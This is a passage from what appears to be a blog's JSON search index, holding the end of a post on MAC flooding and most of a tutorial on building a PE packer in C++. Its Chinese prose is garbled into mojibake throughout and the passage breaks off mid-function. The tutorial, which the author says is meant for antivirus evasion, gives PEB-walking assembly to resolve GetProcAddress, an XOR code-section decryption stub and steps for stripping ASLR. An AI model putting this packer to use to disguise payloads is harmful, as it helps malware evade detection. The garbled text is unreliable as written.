macæ³›æ´ªæ”»å‡»çš„å±€é™æ€§:åªèƒ½åœ¨å±€åŸŸç½‘å†…æ”»å‡»å¦ä¸€ä¸ªå±€åŸŸç½‘å†…æœºå™¨.ä¸”æ”»å‡»ç›®æ ‡å¿…é¡»å’Œè‡ªå·±ç”¨äº¤æ¢æœºæœ‰çº¿è¿æ¥èµ·æ¥ä¹Ÿå°±æ˜¯è¯´ä½ çš„ç”µè„‘å‘èµ·macæ³›æ´ªæ˜¯æ”»å‡»ä¸åˆ°ä½ çš„æ‰‹æœºçš„ã€‚","categories":[],"tags":[{"name":"å†…ç½‘æ¸—é€ä¸æƒé™ç»´æŒ","slug":"å†…ç½‘æ¸—é€ä¸æƒé™ç»´æŒ","permalink":"http://const27.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%8E%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"}]},{"title":"ä»0å¼€å§‹ç”¨C++å†™ä¸€ä¸ªåŠ å£³å™¨","slug":"ä»0å¼€å§‹ç”¨C++å†™ä¸€ä¸ªåŠ å£³å™¨","date":"2021-06-28T13:51:48.301Z","updated":"2021-09-03T13:17:26.978Z","comments":true,"path":"2021/06/28/ä»0å¼€å§‹ç”¨C++å†™ä¸€ä¸ªåŠ å£³å™¨/","link":"","permalink":"http://const27.com/2021/06/28/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%94%A8C++%E5%86%99%E4%B8%80%E4%B8%AA%E5%8A%A0%E5%A3%B3%E5%99%A8/","excerpt":"","text":"å‚è€ƒ:https://blog.csdn.net/qq_31507523/article/details/89438410 å­¦ä¹ ä¸€ä¸‹å†™å£³ï¼Œåœ¨ä»¥åå…æ€ä¸­ä½¿ç”¨ã€‚ åŠ å£³åŸç†æ‰‹å·¥åŠ å£³ç”¨010editoræ‰‹å·¥åŠ å£³äº†è§£ä¸€æ³¢åŸç†ã€‚åŠ å£³åŸç†å¤§è‡´å¦‚ä¸‹ å³æˆ‘ä»¬å‘PEæ–‡ä»¶æ·»åŠ ä¸€ä¸ªåŒºæ®µå¹¶å°†å…¶è®¾ç½®ä¸ºå…¥å£ç‚¹ï¼Œè¿™æ ·PEæ–‡ä»¶æœ€å¼€å§‹æ‰§è¡Œçš„å‘½ä»¤å°±æ˜¯æˆ‘ä»¬æ·»åŠ çš„åŒºæ®µä¹Ÿå°±æ˜¯å£³çš„æŒ‡ä»¤ï¼Œå£³å¯¹åŠ å¯†åŒºè¿›è¡Œè§£å¯†ï¼Œå¯¹å‹ç¼©åŒºè¿›è¡Œè§£å‹ï¼Œå°†åŸæœ¬çš„EXEæ–‡ä»¶è¿˜åŸå‡ºæ¥ï¼Œç„¶åè·³è½¬è‡³åŸç¨‹åºå…¥å£ï¼Œç¨‹åºç…§å¸¸è¿è¡Œã€‚ é¦–å…ˆç”Ÿæˆä¸€ä¸ªæ‰“å°helloçš„exeæ–‡ä»¶ã€‚ #include &lt;stdio.h&gt;int main() &#123; printf(&quot;hello&quot;);&#125; æˆ‘ä»¬ç›®å‰è¦å¹²çš„äº‹æƒ…æ˜¯:ä»¥æ‰‹åŠ¨çš„å½¢å¼å‘PEæ–‡ä»¶æ·»åŠ ä¸€ä¸ªå£³éƒ¨åˆ†å¹¶è®¾ä¸ºç¨‹åºå…¥å£ï¼Œå¹¶ä½¿å…¶èƒ½è·³è½¬å›åŸå…¥å£ã€‚é‚£å°±æ¥å§ ç”¨010editoræ‰“å¼€æˆ‘ä»¬çš„exeæ–‡ä»¶ï¼Œå¯ç”¨exeæ¨¡æ¿åˆ†æã€‚æˆ‘ä»¬é¦–å…ˆä¿®æ”¹å…¶æ–‡ä»¶å¤´numverofsectionå±æ€§ï¼Œè¿™ä¸ªå±æ€§ç”¨æ¥å®šä¹‰å½“å‰PEæ–‡ä»¶å­˜åœ¨å¤šå°‘ä¸ªåŒºæ®µ,å› ä¸ºæˆ‘ä»¬è¦æ·»åŠ ä¸€ä¸ªå£³åŒºæ®µï¼Œæ‰€ä»¥æˆ‘ä»¬å°†å…¶åŠ 1å˜æˆ6 åœ¨æˆ‘ä»¬é‡è½½æ¨¡æ¿åæˆ‘ä»¬å°±ä¼šåœ¨åŒºæ®µè¡¨å‘ç°å¤šå‡ºæ¥ä¸€ä¸ªç©ºçš„åŒºæ®µè¡¨ ä»ä¸Šåˆ°ä¸‹å„ä¸ªæ¯”è¾ƒé‡è¦å­—æ®µçš„æ„æ€æ˜¯\\1. Name è¡¨ç¤ºè¯¥åŒºæ®µçš„åå­—2.VirtualSize è¡¨ç¤ºåœ¨å†…å­˜ä¸­çš„å¤§å°(ä¸€èˆ¬å†…å­˜å¯¹é½ä¸º0x1000)3.virtualaddress è™šæ‹Ÿåœ°å€ å³ä¸Šä¸€ä¸ªåŒºæ®µçš„VirtualAddress + ä¸Šä¸€ä¸ªåŒºæ®µç»å†…å­˜å¯¹é½ç²’åº¦å¯¹é½åçš„å¤§å°4.sizeofdata è¡¨ç¤ºåœ¨æ–‡ä»¶ä¸­çš„å¤§å°ï¼ˆä¸€èˆ¬æ–‡ä»¶å¯¹é½ä¸º0x200)5.pointertorawdata æ–‡ä»¶çš„åç§» å³ ä¸Šä¸€ä¸ªåŒºæ®µçš„PointerToRawData + ä¸Šä¸€ä¸ªåŒºæ®µçš„SizeOfRawData ç„¶åæˆ‘ä»¬é€šè¿‡ä¿®æ”¹ä»¥ä¸Šå„å€¼æ¥å®šä¹‰ä¸€ä¸ªæ–°åŒºæ®µï¼ˆå£³åŒºæ®µ)çš„å±æ€§ è¿™é‡Œçš„virtualsizeçœ‹ç€å¡«ä¸€ä¸ªå°±è¡Œäº†ã€‚æ­¤æ—¶æˆ‘ä»¬åªæ˜¯å®šä¹‰äº†åŒºæ®µè¡¨ï¼Œä½†æ–‡ä»¶ä¸­å¹¶æ²¡æœ‰è¯¥åŒºæ®µå­˜åœ¨ï¼Œæ‰€ä»¥æˆ‘ä»¬å¾—åˆ›å»ºè¯¥åŒºæ®µã€‚ç„¶åè¿˜è¦è®©åŒºæ®µå¯ç¼–è¾‘ï¼ŒæŠŠä¸‹åˆ—å€¼æ”¹ä¸º1å³å¯ ctrl+shift+i å‘ç›®æ ‡æ–‡ä»¶åç§»å¤„æ’å…¥0x200å¤§å°çš„ç©ºé—´ã€‚è¿™æ ·ä¸€æ¥ï¼Œå£³åŒºæ®µå°±åˆ›å»ºå¥½äº†ã€‚ ç„¶åæˆ‘ä»¬è¿˜è¦ä¿®æ”¹ æ‰©å±•å¤´çš„SizeofImage ã€‚å°†ä»–æ”¹ä¸ºæœ€åä¸€ä¸ªåŒºæ®µçš„å†…å­˜åœ°å€+å†…å­˜å¤§å° ç„¶åå»æ‰éšæœºåŸºå€é€‰é¡¹ã€‚ æ‰¾åˆ°æ‰©å±•å¤´çš„DLLå±æ€§å­—æ®µï¼Œå»æ‰éšæœºåŸºå€ï¼ŒæŠŠ40 81æ”¹ä¸º 00 81 æ¥ä¸‹æ¥æˆ‘ä»¬æŠŠç¨‹åºå…¥å£ç‚¹è®¾ç½®ç»™å£³åŒºæ®µã€‚ä½¿ç”¨LORDPEæŠŠå…¥å£ç‚¹è®¾ä¸ºå£³åŒºå—çš„è™šæ‹Ÿåœ°å€ ç„¶åæˆ‘ä»¬ç”¨ODæ‰“å¼€è¿™ä¸ªæ–‡ä»¶ çœŸæ­£çš„åŠ å£³æµç¨‹åˆšåˆšæåˆ°çš„æ‰‹å·¥åŠ å£³ï¼Œä¸è¿‡æ˜¯æœ€æœ€åŸºç¡€çš„åŠ å£³åŸå‹è€Œå·²ï¼ŒçœŸæ­£çš„åŠ å£³è¿˜æ¶‰åŠäº†ä»£ç åŠ è§£å¯†ç­‰æ“ä½œ. çœŸæ­£å†™å£³æ—¶ä¸€èˆ¬å†™ä¸¤ä¸ªä¸œè¥¿ï¼ŒåŠ å£³å™¨å’Œstubæ‰€è°“åŠ å£³å™¨ï¼Œå°±æ˜¯ç»™è¢«åŠ å£³æ–‡ä»¶åˆ›é€ å‡ºä¸€ä¸ªæ–°çš„åŒºæ®µï¼Œ åœ¨æ­¤åŒæ—¶å°†ç¨‹åºä»¥æŸç§æ–¹å¼åŠ å¯†ï¼Œç„¶åæŠŠstubæ”¾å…¥æ–°åŒºæ®µï¼Œå¹¶å°†ç¨‹åºå…¥å£ç‚¹è®¾ä¸ºæ–°åŒºæ®µçš„åœ°å€ï¼Œç„¶ååœ¨æ–°åŒºæ®µç»“æŸåè·³è½¬å›åŸç¨‹åºå…¥å£ã€‚è¿™ä¸ªæ–°åŒºæ®µæˆ‘ä»¬å«åšå£³åŒºæ®µ.é‚£ä¹ˆè¿™ä¸ªstubå°±æ˜¯åŠ å£³åç¨‹åºæœ€å…ˆæ‰§è¡Œçš„å‘½ä»¤äº†ï¼Œå®ƒæ‰§è¡Œè§£å¯†ç®—æ³•ï¼Œå°†åŸç¨‹åºé‡Šæ”¾å‡ºæ¥ã€‚ åŸºäºc++çš„å£³ç¼–å†™å®ç°äº†ä¸€ä¸ªè–›å®šè°”çš„åŠ å£³å™¨ï¼ˆé›¾ï¼‰åŠ å£³å¥½çš„ç¨‹åºæœ‰ä¸€å®šå‡ ç‡è¿è¡Œä¸äº†ï¼ŒåŸå› æœªçŸ¥ã€‚ã€‚ https://github.com/ConsT27/PackingEXE/tree/master ğŸ‘ˆé¡¹ç›®åœ°å€ å¾ˆå¤§ä¸€éƒ¨åˆ†ä¸Šæ˜¯å€Ÿé‰´è¿™ä¸ªè€å“¥çš„https://github.com/TonyChen56/GuiShou_Pack ç¬¬ä¸€æ¬¡æ¥è§¦æ±‡ç¼–ç¼–ç¨‹ï¼Œc++ç¼–ç¨‹ï¼Œä¸Šæ¥å°±æ˜¯æè¿™ä¹ˆä¸€ä¸ªé¡¹ç›®ï¼Œæäº†å¿«ä¸¤ä¸ªæ˜ŸæœŸï¼Œç¡®å®æœ‰ç‚¹ç—›è‹¦ï¼Œåˆ°ç°åœ¨è¿˜æœ‰å¾ˆå¤§éƒ¨åˆ†ä¸æ˜¯å¾ˆæ‡‚çš„åœ°æ–¹ï¼ˆæ¯”å¦‚è®¸å¤šæ•°æ®ç±»å‹ä»¥åŠåº•å±‚æ±‡ç¼–ï¼ˆç¬‘ğŸ˜è¿™ä¸ªé¡¹ç›®ä¹Ÿå­˜åœ¨bugï¼Œä¹Ÿå°±æ˜¯åˆšåˆšè¯´çš„ç¨‹åºæœ‰å‡ ç‡ä¸èƒ½è¿è¡Œçš„é—®é¢˜ã€‚ğŸ˜¡ä½†æ˜¯ä¹Ÿå­¦åˆ°äº†æŒºå¤šï¼Œæ¯”å¦‚PEBåŠ¨æ€å¯»å€ï¼ŒPEæ–‡ä»¶ç»“æ„ç­‰ç­‰ã€‚ğŸ˜è‹¦äºç½‘ä¸Šæ²¡æœ‰ä¸€ç¯‡æ–‡ç« è¯¦ç»†çš„äº¤ä»£äº†æŠ€æœ¯çš„ç»†èŠ‚ï¼Œæ‰€ä»¥è¿™ç¯‡æ–‡ç« ä¼šå°½å¯èƒ½çš„è¯¦ç»†ã€‚æ¥ä¸‹æ¥æ˜¯å„ä¸ªæµç¨‹çš„è¯¦ç»†å®ç°æ–¹æ³•ï¼Œè‡³äºæ€ä¹ˆæŠŠå„ä¸ªæµç¨‹é“¾æ¥èµ·æ¥ï¼Œå¸ˆå‚…ä»¬å¯ä»¥é€šè¿‡ä¸‹è½½ä¸Šé¢æåˆ°çš„ä¸¤ä¸ªé¡¹ç›®æ¥çœ‹ä¸€ä¸‹ã€‚ Stubstubæ˜¯è¢«æ¤å…¥åˆ°PEæ–‡ä»¶ä¸­çš„ä»£ç ï¼Œå®ƒä¸€èˆ¬ä¼šå¹²ä¸‹é¢è¿™äº›äº‹æƒ…ã€‚ æµç¨‹å¦‚ä¸‹ 0.åˆå¹¶dataï¼Œrdataåˆ°text1.PEBåŠ¨æ€å¯»å€ï¼Œéå†å¯¼å‡ºè¡¨æ‰¾åˆ°GetProcAddresså‡½æ•°2.è§£å¯†3.ä¿®æ”¹å…¥å£ç‚¹åˆ°åŸå…¥å£ç‚¹ åŒæ—¶stubä¸€èˆ¬ä»¥dllçš„å½¢å¼å­˜åœ¨ã€‚åŸå› æ˜¯DLLé€šå¸¸è‡ªå¸¦é‡å®šä½è¡¨ï¼Œè¿™åœ¨æˆ‘ä»¬çš„ç§»æ¤è¿‡ç¨‹ä¸­çš„é‡å®šä½æ“ä½œä¸­æä¾›äº†å·¨å¤§çš„ä¾¿åˆ©ã€‚ åˆå¹¶æ•°æ®æ®µæˆ‘ä»¬è¦ç§»æ¤stubè¿‡å»ï¼Œè‚¯å®šéœ€è¦ç§»æ¤ä»£ç æ®µï¼Œä¹Ÿéœ€è¦ç§»æ¤æ•°æ®æ®µã€‚ä¸å¦‚æˆ‘ä»¬å¹²è„†æŠŠæ•°æ®æ®µåˆå¹¶åˆ°ä»£ç æ®µï¼Œä¸€å—ç§»æ¤è¿‡å»ã€‚ PEBåŠ¨æ€å¯»å€&amp;å¯¼å‡ºè¡¨éå†æ‰¾å‡½æ•°ä¸ºä»€ä¹ˆä¼šç”¨åˆ°è¿™ä¸ªæŠ€æœ¯ç¼–å†™stubï¼Ÿå› ä¸ºæˆ‘ä»¬çš„stub.dllæ¤å…¥åˆ°å®¿ä¸»ç¨‹åºæ—¶ï¼Œåªæœ‰.textæ¤å…¥è¿‡å»ï¼Œæ²¡æœ‰å¯¹åº”çš„å¯¼å…¥è¡¨ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„stubæ— æ³•ç›´æ¥è°ƒç”¨ä¸€äº›APIã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦åŠ¨æ€è·å–å„ç§APIã€‚å…¶ä¸­æˆ‘é‡‡ç”¨çš„æ˜¯PEBåŠ¨æ€æŸ¥è¯¢å¾—åˆ°GetProcAddresså‡½æ•°ï¼Œç„¶åç”¨GetProcAddresså‡½æ•°å»è·å–å„ä¸ªAPIã€‚ é‚£ä¹ˆï¼Œä»€ä¹ˆæ˜¯PEBï¼ŸPEBæ˜¯ä¸€ä¸ªå¾®è½¯è¿˜æœªå®Œå…¨å…¬å¼€ä½œç”¨çš„ä¸€ä¸ªç»“æ„ï¼Œå®ƒå«åš è¿›ç¨‹ç¯å¢ƒä¿¡æ¯å— ï¼ŒåŒ…å«äº†è¿›ç¨‹çš„ä¿¡æ¯ã€‚å…¶ç»“æ„å¦‚ä¸‹ typedef struct _PEB &#123; BYTE Reserved1[2]; BYTE BeingDebugged; &#x2F;&#x2F;è¢«è°ƒè¯•çŠ¶æ€ BYTE Reserved2[1]; PVOID Reserved3[2]; PPEB_LDR_DATA Ldr; PRTL_USER_PROCESS_PARAMETERS ProcessParameters; BYTE Reserved4[104]; PVOID Reserved5[52]; PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine; BYTE Reserved6[128]; PVOID Reserved7[1]; ULONG SessionId;&#125; PEB, *PPEB;å¤åˆ¶ä»£ç  æˆ‘ä»¬å…³å¿ƒçš„æ˜¯PEBåç§»0cå¾—åˆ°çš„ PPEB_LDR_DATA Ldr; å®ƒæ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼ŒæŒ‡å‘ä¸€ä¸ª PPEB_LDR_DATA ç»“æ„ï¼Œ å­˜æ”¾ç€å·²ç»è¢«è¿›ç¨‹è£…åœ¨çš„åŠ¨æ€é“¾æ¥åº“çš„ä¿¡æ¯ typedef struct _PEB_LDR_DATA&#123; ULONG Length; &#x2F;&#x2F; +0x00 BOOLEAN Initialized; &#x2F;&#x2F; +0x04 PVOID SsHandle; &#x2F;&#x2F; +0x08 LIST_ENTRY InLoadOrderModuleList; &#x2F;&#x2F; +0x0c LIST_ENTRY InMemoryOrderModuleList; &#x2F;&#x2F; +0x14 LIST_ENTRY InInitializationOrderModuleList;&#x2F;&#x2F; +0x1c&#125; PEB_LDR_DATA,*PPEB_LDR_DATA; &#x2F;&#x2F; +0x24 PPEB_LDR_DATA åç§»1cæ˜¯ä¸€ä¸ªæŒ‡å‘LIST_ENTRY InInitializationOrderModuleListç»“æ„çš„æŒ‡é’ˆï¼Œè¿™ä¸ªç»“æ„ å­˜æ”¾ç€æŒ‡å‘æ¨¡å—åˆå§‹åŒ–é“¾è¡¨çš„å¤´ ï¼Œ æŒ‰é¡ºåºå­˜æ”¾ç€PEè£…å…¥è¿è¡Œæ—¶åˆå§‹åŒ–æ¨¡å—ä¿¡æ¯ï¼Œä¸€èˆ¬æ¥è¯´ç¬¬ä¸€ä¸ªé“¾è¡¨ç»“ç‚¹æ˜¯ntdll.dll,ç¬¬äºŒä¸ªé“¾è¡¨ç»“ç‚¹å°±æ˜¯kernel32.dll ã€‚æˆ‘ä»¬å°±åœ¨å…¶ä¸­æ‰¾åˆ°kernel32.dllçš„ä¿¡æ¯ï¼Œè·å–å…¶PEä¿¡æ¯ï¼Œå¾—åˆ°å¯¼å‡ºè¡¨ï¼Œå¾ªç¯éå†å¾—åˆ°GetProcAddresså‡½æ•°ã€‚å¦å¤–ï¼ŒPEBåœ°å€å†TEBåç§»0x30å¤„ã€‚ç”¨æ±‡ç¼–è¯­è¨€è¡¨ç¤ºå°±æ˜¯ fs:[0x30]ã€‚ ä»¥ä¸Šæ˜¯PEBå¯»å€çš„å¤§è‡´æµç¨‹ï¼Œå¦å¤–è¿˜æœ‰ä¸€ä¸ªæ¯”è¾ƒå…³é”®çš„ç‚¹æ˜¯éå†kernel32.dllå¯¼å‡ºè¡¨è·å¾—GetProcAddresså‡½æ•°ä¿¡æ¯ã€‚å…³äºå¯¼å‡ºè¡¨å¯ä»¥çœ‹çœ‹è¿™ä¸ªæ–‡ç« https://blog.csdn.net/evileagle/article/details/12176797 é¦–å…ˆä¸€ä¸ªå¯¼å‡ºè¡¨ç»“æ„ä½“å¦‚ä¸‹ typedef struct _IMAGE_EXPORT_DIRECTORY &#123; DWORD Characteristics; &#x2F;&#x2F;ä¸€èˆ¬ä¸º0ï¼Œæ²¡å•¥ç”¨ DWORD TimeDateStamp; &#x2F;&#x2F;å¯¼å‡ºè¡¨ç”Ÿæˆçš„æ—¶é—´ WORD MajorVersion; &#x2F;&#x2F;ç‰ˆæœ¬ï¼Œä¹Ÿæ˜¯0æ²¡å•¥ç”¨ WORD MinorVersion; &#x2F;&#x2F;ä¹Ÿæ˜¯æ²¡å•¥ç”¨çš„ç‰ˆæœ¬ä¿¡æ¯ä¸€èˆ¬ä¸º0 DWORD Name; &#x2F;&#x2F;å½“å‰å¯¼å‡ºè¡¨çš„æ¨¡å—åå­— DWORD Base; &#x2F;&#x2F;åºå·è¡¨ä¸­åºå·çš„åŸºæ•° DWORD NumberOfFunctions; &#x2F;&#x2F;å¯¼å‡ºå‡½æ•°æ•°é‡ DWORD NumberOfNames; &#x2F;&#x2F;æŒ‰åå­—å¯¼å‡ºå‡½æ•°çš„æ•°é‡ DWORD AddressOfFunctions; &#x2F;&#x2F; åºå·è¡¨ DWORD AddressOfNames; &#x2F;&#x2F; åç§°è¡¨ DWORD AddressOfNameOrdinals; &#x2F;&#x2F; åœ°å€è¡¨&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY; å…¶ä¸­åºå·è¡¨çš„èµ·å§‹åºå·æ˜¯Baseå±æ€§å®šä¹‰çš„å€¼ã€‚ä»¥ä¸‹æ˜¯å¯¼å‡ºè¡¨çš„åºå·åç§°åœ°å€è¡¨çš„å…³ç³» æˆ‘ä»¬çš„éå†æµç¨‹æ˜¯ï¼Œå…ˆéå†åç§°è¡¨æ‰¾åˆ°GetProcAddressåœ¨åç§°æ•°ç»„ä¸­çš„ä¸‹æ ‡ï¼Œç„¶åæ ¹æ®è¿™ä¸ªä¸‹æ ‡å»åºå·æ•°ç»„ä¸­æ‰¾ç›¸åŒä¸‹æ ‡çš„åºå·å€¼ï¼Œç„¶åä»¥è¿™ä¸ªåºå·å€¼ä¸ºä¸‹æ ‡å»æ‰¾åœ°å€æ•°ç»„ä¸­çš„å¯¹åº”å€¼ã€‚æˆ‘ä»¬æ‰¾åˆ°çš„åœ°å€è¡¨ä¸­çš„å€¼å°±æ˜¯å‡½æ•°å…¥å£ ä¸‹é¢æˆ‘æŠŠè¿™æ®µç¨‹åºçš„æ±‡ç¼–ä»£ç æ”¾å‡ºæ¥ã€‚æˆ‘æ˜¯ç”¨å†…è”æ±‡ç¼–æŠŠè¿™æ®µä»£ç å¡è¿›C++çš„ void GetApis()&#123; HMODULE hKernel32; _asm &#123; pushad; ; &#x2F;&#x2F;è·å–kernel32.dllçš„åŠ è½½åŸºå€; mov eax, fs: [0x30] ; &#x2F;&#x2F;å¾—åˆ°PEBåœ°å€ mov eax, [eax + 0ch]; &#x2F;&#x2F;è·å¾—LDR_PEB_DATAåœ°å€ mov eax, [eax + 0ch]; &#x2F;&#x2F;è·å¾—LIST_ENTRY InLoadOrderModuleList;åœ°å€ mov eax, [eax]; &#x2F;&#x2F;è·å¾—LIST_ENTRY InLoadOrderModuleListä¸‹ä¸€é¡¹çš„åœ°å€ mov eax, [eax]; &#x2F;è·å¾—LIST_ENTRY InLoadOrderModuleListä¸‹ä¸‹é¡¹å³æˆ‘ä»¬éœ€è¦çš„LIST_ENTRY InInitializationOrderModuleListçš„åœ°å€ mov eax, [eax + 018h]; &#x2F;&#x2F;è·å¾—kernel32.dllåœ°å€ mov hKernel32, eax; mov ebx, [eax + 03ch];&#x2F;&#x2F;è·å¾—kernel32.dll NTå¤´RVA add ebx, eax; &#x2F;&#x2F;NTå¤´çš„VA add ebx, 078h; &#x2F;&#x2F;è·å¾—åŒºæ®µè¡¨ mov ebx, [ebx]; &#x2F;&#x2F;è·å¾—å¯¼å‡ºè¡¨RVA add ebx, eax; &#x2F;&#x2F;å¯¼å‡ºè¡¨VA lea ecx, [ebx + 020h]; mov ecx, [ecx]; &#x2F;&#x2F; ecx &#x3D;&gt; åç§°è¡¨çš„é¦–åœ°å€(rva); add ecx, eax; &#x2F;&#x2F; ecx &#x3D;&gt; åç§°è¡¨çš„é¦–åœ°å€(va); xor edx, edx; &#x2F;&#x2F; ä½œä¸ºç´¢å¼•(index)æ¥ä½¿ç”¨. _WHILE:; mov esi, [ecx + edx * 4];&#x2F;&#x2F;åç§°æ•°ç»„å…¥å£ç‚¹rvaï¼Œåç§°æ•°ç»„å•ä½å¤§å°4å­—èŠ‚ lea esi, [esi + eax]; &#x2F;&#x2F;å…¥å£ç‚¹VA cmp dword ptr[esi], 050746547h; &#x2F;&#x2F;è¿›è¡Œåç§°åŒ¹é…ï¼Œ050746547hå³å°ç«¯å­˜å‚¨çš„GetP jne _LOOP;&#x2F;&#x2F;ä¸ç›¸ç­‰å°±è·³å…¥_LOOPæ®µ cmp dword ptr[esi + 4], 041636f72h; &#x2F;&#x2F;åé™ˆåŒ¹é…ï¼ŒrocAï¼Œä»¥ä¸‹ä¾æ¬¡ä¸ºddreï¼Œss jne _LOOP; cmp dword ptr[esi + 8], 065726464h; jne _LOOP; cmp word ptr[esi + 0ch], 07373h; jne _LOOP; mov edi, [ebx + 024h]; add edi, eax; &#x2F;&#x2F;è·å¾—åºå·è¡¨VA mov di, [edi + edx * 2]; &#x2F;&#x2F;è·å¾—åºå·æ•°ç»„ä¸­å¯¹åº”ä¸‹æ ‡çš„åœ°å€ï¼Œåºå·æ•°ç»„å•ä½å¤§å°2å­—èŠ‚ and edi, 0FFFFh; &#x2F;&#x2F;ç»™diæä½åˆ°32ä½ï¼Œå³ç»™äºˆedi åºå·è¡¨ä¸­å¯¹åº”ä¸‹æ ‡çš„åœ°å€ mov edx, [ebx + 01ch]; add edx, eax; &#x2F;&#x2F;è·å¾—åœ°å€è¡¨ mov edi, [edx + edi * 4]; &#x2F;&#x2F;è·å¾—åœ°å€æ•°ç»„ä¸­ï¼Œåºå·å¯¹åº”çš„å€¼ï¼Œåœ°å€æ•°ç»„å•ä½å¤§å°4å­—èŠ‚ add edi, eax; &#x2F;&#x2F;è·å¾—GetProcAddressçš„å…¥å£åœ°å€ mov MyGetProcAddress, edi; &#x2F;&#x2F;èµ‹å€¼ jmp _ENDWHILE; &#x2F;&#x2F;END _LOOP:; inc edx; &#x2F;&#x2F; ++index; jmp _WHILE; _ENDWHILE:; popad; &#125; è§£å¯†è§£å¯†ä»£ç æ®µã€‚è¿™æ®µå¥½å†™ã€‚ void Decrypt()&#123; unsigned char* pText &#x3D; (unsigned char*)g_conf.textScnRVA + 0x400000;&#x2F;&#x2F;é”å®šåˆ°PEæ–‡ä»¶çš„textæ®µï¼ˆå› ä¸ºåŠ å£³æ—¶å»æ‰äº†åŸºå€éšæœºåŒ–ï¼Œæ‰€ä»¥è‡ªä¿¡çš„æŠŠåŸºå€å¡«æˆ0x400000 DWORD old &#x3D; 0; MyVirtualProtect(pText, g_conf.textScnSize, PAGE_READWRITE, &amp;old);&#x2F;&#x2F;ä¿®æ”¹ä»£ç æ®µçš„å±æ€§,æ³¨æ„æˆ‘ä»¬è¿™é‡Œä½¿ç”¨äº†åŠ¨æ€è·å¾—çš„ &#x2F;&#x2F;è§£å¯†ä»£ç æ®µ for (DWORD i &#x3D; 0; i &lt; g_conf.textScnSize; i++) &#123; pText[i] ^&#x3D; g_conf.key; &#125; &#x2F;&#x2F;æŠŠå±æ€§ä¿®æ”¹å›å» MyVirtualProtect(pText, g_conf.textScnSize, old, &amp;old);&#125; ä¿®æ”¹å…¥å£ç‚¹_asm &#123; mov eax, g_conf.srcOep; &#x2F;&#x2F;å…¥å£ç‚¹æ˜¯g_conf.srcOep add eax, 0x400000 jmp eax &#125; åŠ å£³å™¨åŠ å£³å™¨æµç¨‹å¦‚ä¸‹ 1.æ‰“å¼€éœ€è¦è¢«åŠ å£³çš„PEæ–‡ä»¶2.åŠ è½½stub3.åŠ å¯†ä»£ç æ®µ4.æ·»åŠ æ–°åŒºæ®µ5.stubé‡å®šä½ä¿®å¤6.stubç§»æ¤7.PEæ–‡ä»¶å…¥å£ç‚¹ä¿®æ”¹8.å»éšæœºåŸºå€9.ä¿å­˜æ–‡ä»¶ ä»¥ä¸‹çš„å„ä¸ªæµç¨‹æè¿°ä¸­ä¼šç”¨åˆ°è¯¸å¤šè‡ªå®šä¹‰å‡½æ•°ï¼Œæˆ‘å…ˆè´´ä¸Šæ¥å§ã€‚ è¯¸å¤šè‡ªå®šå‡½æ•°&amp;ç»“æ„ä½“&#x2F;&#x2F;****************&#x2F;&#x2F;å¯¹é½å¤„ç†&#x2F;&#x2F;time:2020&#x2F;11&#x2F;5&#x2F;&#x2F;****************int AlignMent(_In_ int size, _In_ int alignment) &#123; return (size) % (alignment)&#x3D;&#x3D;0 ? (size) : ((size) &#x2F; alignment+1) * (alignment);&#125;&#x2F;&#x2F;***********************&#x2F;&#x2F;PEä¿¡æ¯è·å–å‡½æ•°ç°‡&#x2F;&#x2F;time:2020&#x2F;11&#x2F;2&#x2F;&#x2F;***********************PIMAGE_DOS_HEADER GetDosHeader(_In_ char* pBase) &#123; return PIMAGE_DOS_HEADER(pBase);&#125;PIMAGE_NT_HEADERS GetNtHeader(_In_ char* pBase) &#123;return PIMAGE_NT_HEADERS(GetDosHeader(pBase)-&gt;e_lfanew+(SIZE_T)pBase);&#125;PIMAGE_FILE_HEADER GetFileHeader(_In_ char* pBase) &#123; return &amp;(GetNtHeader(pBase)-&gt;FileHeader);&#125;PIMAGE_OPTIONAL_HEADER32 GetOptHeader(_In_ char* pBase) &#123; return &amp;(GetNtHeader(pBase)-&gt;OptionalHeader);&#125;PIMAGE_SECTION_HEADER GetLastSec(_In_ char* pBase) &#123; DWORD SecNum &#x3D; GetFileHeader(pBase)-&gt;NumberOfSections; PIMAGE_SECTION_HEADER FirstSec &#x3D; IMAGE_FIRST_SECTION(GetNtHeader(pBase)); PIMAGE_SECTION_HEADER LastSec &#x3D; FirstSec + SecNum - 1; return LastSec;&#125;PIMAGE_SECTION_HEADER GetSecByName(_In_ char* pBase,_In_ const char* name) &#123; DWORD Secnum &#x3D; GetFileHeader(pBase)-&gt;NumberOfSections; PIMAGE_SECTION_HEADER Section &#x3D; IMAGE_FIRST_SECTION(GetNtHeader(pBase)); char buf[10] &#x3D; &#123; 0 &#125;; for (DWORD i &#x3D; 0; i &lt; Secnum; i++) &#123; memcpy_s(buf, 8, (char*)Section[i].Name, 8); if (!strcmp(buf, name)) &#123; return Section + i; &#125; &#125; return nullptr;&#125;typedef struct _StubConf&#123; DWORD srcOep; &#x2F;&#x2F;å…¥å£ç‚¹ DWORD textScnRVA; &#x2F;&#x2F;ä»£ç æ®µRVA DWORD textScnSize; &#x2F;&#x2F;ä»£ç æ®µçš„å¤§å° DWORD key; &#x2F;&#x2F;è§£å¯†å¯†é’¥&#125;StubConf;struct StubInfo&#123; char* dllbase; &#x2F;&#x2F;stub.dllçš„åŠ è½½åŸºå€ DWORD pfnStart; &#x2F;&#x2F;stub.dll(start)å¯¼å‡ºå‡½æ•°çš„åœ°å€ StubConf* pStubConf; &#x2F;&#x2F;stub.dll(g_conf)å¯¼å‡ºå…¨å±€å˜é‡çš„åœ°å€&#125;; æ‰“å¼€PEæ–‡ä»¶è¿™é‡Œé‡‡ç”¨çš„æ–¹æ³•æ˜¯åˆ©ç”¨CreateFileAå‡½æ•°ã€‚åŒæ—¶è¿™ä¸ªå‡½æ•°è¿˜æŠ›å‡ºäº†ä¸€ä¸ªæŒ‡å‘PEæ–‡ä»¶å¤§å°çš„æŒ‡é’ˆ char* GetFileHmoudle(_In_ const char* path,_Out_opt_ DWORD* nFileSize) &#123; &#x2F;&#x2F;æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶å¹¶è·å¾—æ–‡ä»¶å¥æŸ„ HANDLE hFile 